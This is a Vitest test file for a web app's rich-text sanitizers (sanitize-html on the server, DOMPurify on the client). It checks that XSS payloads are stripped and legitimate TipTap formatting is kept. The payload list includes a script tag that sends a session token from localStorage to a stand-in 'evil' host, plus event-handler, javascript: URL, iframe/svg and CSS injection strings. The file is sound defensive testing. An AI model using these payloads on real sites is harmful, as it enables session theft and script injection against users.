import { describe, it, expect } from 'vitest';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import {
  filterStyleAttr,
  RICH_TEXT_SANITIZE_CONFIG,
  applyAttributeWhitelist,
  sanitizeImageUrl,
} from './sanitize';
import {
  sanitizeRichTextServer,
  sanitizeContentServer,
  sanitizeTabsForSave,
} from './sanitize.server';

// ─── XSS payloads (Security-Audit.md critical #2) ────────────────────────────

const ATTACK_PAYLOADS: { name: string; input: string; mustNotContain: RegExp[] }[] = [
  {
    name: 'script element',
    input: '<p>hi</p><script>fetch("https://evil/x?c="+localStorage.dnd_session)</script>',
    mustNotContain: [/<script/i, /evil/],
  },
  {
    name: 'event handler on allowed tag',
    input: '<p onmouseover="alert(1)">hover</p><img src="https://ok.test/a.png" onerror="steal()">',
    mustNotContain: [/onmouseover/i, /onerror/i],
  },
  {
    name: 'javascript: href',
    input: '<a href="javascript:alert(document.cookie)">click</a><a href="JaVaScRiPt:evil()">x</a>',
    mustNotContain: [/javascript/i, /href=""/i, /evil/],
  },
  {
    name: 'iframe / object / embed / svg',
    input: '<iframe src="https://evil"></iframe><object data="x"></object><embed src="y"><svg onload="alert(1)"></svg>',
    mustNotContain: [/iframe/i, /<object/i, /<embed/i, /<svg/i, /onload/i, /evil/],
  },
  {
    name: 'data: text/html in img src',
    input: '<img src="data:text/html;base64,PHNjcmlwdD4=">',
    mustNotContain: [/data:/i],
  },
  {
    name: 'style attribute smuggling',
    input: '<p style="text-align:center;position:fixed;top:0;background:url(javascript:alert(1))">x</p>',
    mustNotContain: [/position/i, /url\(/i, /javascript/i],
  },
  {
    name: 'meta refresh',
    input: '<meta http-equiv="refresh" content="0;url=https://evil">',
    mustNotContain: [/<meta/i, /evil/],
  },
];

// ─── Server path (sanitize-html) ─────────────────────────────────────────────

describe('sanitizeRichTextServer', () => {
  it.each(ATTACK_PAYLOADS)('strips $name', ({ input, mustNotContain }) => {
    const out = sanitizeRichTextServer(input);
    for (const re of mustNotContain) expect(out).not.toMatch(re);
  });

  it('keeps legitimate TipTap formatting', () => {
    const input = [
      '<h2 style="text-align:center">Title</h2>',
      '<p>Hello <strong>bold</strong>, <em>italic</em>, <u>under</u>, <s>strike</s>,',
      ' <span style="color:#DC2626">red</span>, <span style="background-color:rgb(250, 204, 21)">hl</span>,',
      ' <span style="font-size:18px">big</span>.</p>',
      '<ul><li>one</li><li>two</li></ul>',
      '<blockquote><p>quote</p></blockquote>',
      '<pre><code>const x = 1;</code></pre>',
      '<table><thead><tr><th colspan="2">H</th></tr></thead><tbody><tr><td>a</td><td>b</td></tr></tbody></table>',
      '<p><a href="https://example.com">link</a><img src="https://blob.vercel-storage.com/abc.png" alt="img"></p>',
      '<hr><p>end</p>',
    ].join('');
    const out = sanitizeRichTextServer(input);
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toContain('<em>italic</em>');
    expect(out).toContain('<u>under</u>');
    expect(out).toContain('<s>strike</s>');
    expect(out).toContain('color:#DC2626');
    expect(out).toContain('text-align:center');
    expect(out).toContain('background-color:rgb(250, 204, 21)');
    expect(out).toContain('font-size:18px');
    expect(out).toContain('<ul>');
    expect(out).toContain('<blockquote>');
    expect(out).toContain('<pre><code>');
    expect(out).toContain('colspan="2"');
    expect(out).toContain('<a href="https://example.com"');
    expect(out).toContain('https://blob.vercel-storage.com/abc.png');
    expect(out).toContain('<hr');
  });

  it('strips class attributes server-side', () => {
    const out = sanitizeRichTextServer('<p class="mention-pill">@jo</p>');
    expect(out).toBe('<p>@jo</p>');
  });

  it('keeps card-link data attributes on spans (Feature 10)', () => {
    const out = sanitizeRichTextServer(
      '<p><span data-card-id="abc-123" data-card-type="npc" data-card-title="Zog" class="card-link" title="Zog">Zog</span></p>'
    );
    expect(out).toContain('data-card-id="abc-123"');
    expect(out).toContain('data-card-type="npc"');
    expect(out).toContain('data-card-title="Zog"');
    expect(out).not.toContain('class="card-link"');
    expect(out).not.toContain(' title="Zog"');
  });

  it('drops unknown tags but keeps their text', () => {
    expect(sanitizeRichTextServer('<p>before<custom-tag onclick="x()">inner</custom-tag>after</p>'))
      .toBe('<p>beforeinnerafter</p>');
  });
});

// ─── Client path (DOMPurify + shared config) ─────────────────────────────────

describe('client DOMPurify sanitization', () => {
  const window = new JSDOM('<!DOCTYPE html><html><body></body></html>').window as unknown as Window & typeof globalThis;
  const DOMPurify = createDOMPurify(window as never);
  DOMPurify.addHook('afterSanitizeAttributes', applyAttributeWhitelist);

  const sanitize = (html: string) => DOMPurify.sanitize(html, RICH_TEXT_SANITIZE_CONFIG) as string;

  it.each(ATTACK_PAYLOADS)('strips $name', ({ input, mustNotContain }) => {
    const out = sanitize(input);
    for (const re of mustNotContain) expect(out).not.toMatch(re);
  });

  it('keeps render-time mention pills and preview classes', () => {
    const out = sanitize('<p>hey <span class="mention-pill">@jo</span> and <a href="https://ok">link</a></p>');
    expect(out).toContain('class="mention-pill"');
    expect(out).toContain('<p>hey');
  });

  it('keeps card-link data attributes and the render-time class (Feature 10)', () => {
    const out = sanitize(
      '<p><span data-card-id="abc-123" data-card-type="location" data-card-title="Cave">Cave</span></p>'
    );
    expect(out).toContain('data-card-id="abc-123"');
    expect(out).toContain('data-card-type="location"');
    expect(out).toContain('data-card-title="Cave"');
  });

  it('keeps alignment styles but drops disallowed style properties', () => {
    const out = sanitize('<p style="text-align:right;position:fixed">x</p>');
    expect(out).toContain('text-align: right');
    expect(out).not.toContain('position');
  });

  it('keeps blob img sources but strips data:image (embedded base64)', () => {
    const out = sanitize('<img src="blob:https://app.example/uuid" alt="a"><img src="data:image/png;base64,AAAA" alt="b">');
    expect(out).toContain('blob:https://app.example/uuid');
    expect(out).not.toContain('data:image');
    expect(out).not.toContain('base64');
  });
});

// ─── filterStyleAttr ─────────────────────────────────────────────────────────

describe('filterStyleAttr', () => {
  it('keeps allowlisted properties and drops the rest', () => {
    expect(filterStyleAttr('text-align: center; position: fixed; color:#DC2626'))
      .toBe('text-align: center; color: #DC2626');
  });

  it('rejects unknown values for allowlisted properties', () => {
    expect(filterStyleAttr('font-size: calc(100% + 1px); float: left')).toBe('float: left');
    expect(filterStyleAttr('color: expression(alert(1))')).toBe('');
    expect(filterStyleAttr('text-align: center; text-align: left')).toBe('text-align: center; text-align: left');
  });

  it('returns empty string for junk', () => {
    expect(filterStyleAttr('')).toBe('');
    expect(filterStyleAttr(';;;')).toBe('');
  });
});

// ─── sanitizeImageUrl ────────────────────────────────────────────────────────

describe('sanitizeImageUrl', () => {
  it('accepts http(s) and blob URLs', () => {
    expect(sanitizeImageUrl('https://blob.vercel-storage.com/a.png')).toBe('https://blob.vercel-storage.com/a.png');
    expect(sanitizeImageUrl('blob:https://app.example/123')).toBe('blob:https://app.example/123');
  });

  it('rejects data:image, javascript:, data:text/html, and garbage', () => {
    expect(sanitizeImageUrl('data:image/png;base64,AAAA')).toBe('');
    expect(sanitizeImageUrl('javascript:alert(1)')).toBe('');
    expect(sanitizeImageUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe('');
    expect(sanitizeImageUrl('not a url')).toBe('');
    expect(sanitizeImageUrl('')).toBe('');
  });
});

// ─── sanitizeContentServer ───────────────────────────────────────────────────

describe('sanitizeContentServer', () => {
  it('sanitizes rich text content', () => {
    expect(sanitizeContentServer('<p>hi<script>x()</script></p>')).toBe('<p>hi</p>');
  });

  it('validates URL content (image-type items)', () => {
    expect(sanitizeContentServer('https://blob.vercel-storage.com/map.png')).toBe('https://blob.vercel-storage.com/map.png');
    expect(sanitizeContentServer('javascript:alert(1)')).toBe('');
  });

  it('leaves plain text alone', () => {
    expect(sanitizeContentServer('A & B <3')).toContain('A &amp; B');
  });
});

// ─── sanitizeTabsForSave ─────────────────────────────────────────────────────

describe('sanitizeTabsForSave', () => {
  it('sanitizes item content, field text values, image urls, and comments', () => {
    const tabs = [{
      id: 't1',
      name: 'Tab',
      color: '#000',
      connections: [],
      items: [{
        id: 'i1', type: 'npc', x: 0, y: 0, width: 1, height: 1,
        title: 'Evil', content: '<p>x</p><script>alert(1)</script>', date: '', color: '',
        tags: [], visibility: 'all', ownerId: 'u1', comments: [
          { id: 'c1', userId: 'u1', userName: 'jo', text: 'nice <img src=x onerror=alert(1)>', timestamp: '' },
        ],
        fields: [
          { id: 'f1', label: 'Notes', type: 'text', textValue: '<b>ok</b><iframe src="https://evil"></iframe>' },
          { id: 'f2', label: 'Pic', type: 'image', imageUrl: 'javascript:alert(1)' },
        ],
      }],
    }];
    const out = sanitizeTabsForSave(tabs as never);
    expect(out[0].items[0].content).toBe('<p>x</p>');
    expect(out[0].items[0].comments[0].text).not.toContain('onerror');
    expect(out[0].items[0].fields![0].textValue).toBe('<b>ok</b>');
    expect(out[0].items[0].fields![1].imageUrl).toBe('');
  });

  it('returns the same tab reference when nothing changed', () => {
    const tabs = [{
      id: 't1', name: 'Tab', color: '#000', connections: [], annotations: [],
      items: [{
        id: 'i1', type: 'note', x: 0, y: 0, width: 1, height: 1,
        title: 'Plain', content: '<p>plain</p>', date: '', color: '', tags: [],
        visibility: 'all', ownerId: 'u1', comments: [],
      }],
    }];
    const out = sanitizeTabsForSave(tabs as never);
    expect(out[0]).toBe(tabs[0]);
  });
});
